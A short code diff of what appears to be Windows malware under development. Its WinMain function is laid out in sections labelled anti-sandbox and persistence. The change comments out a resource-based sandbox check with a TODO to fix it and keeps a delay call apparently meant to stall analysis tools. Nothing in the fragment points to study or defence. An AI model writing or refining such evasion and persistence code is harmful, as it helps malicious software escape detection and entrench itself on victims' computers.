@@ -10,10 +10,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     // 1. ANTI-SANDBOX
 
+/*
+TODO: FIX RESOURCE CHECK
     if (!check_resources()) {
         return 0;
     }
-    
+*/  
     smart_delay();
 
     // 2. PERSISTENCE
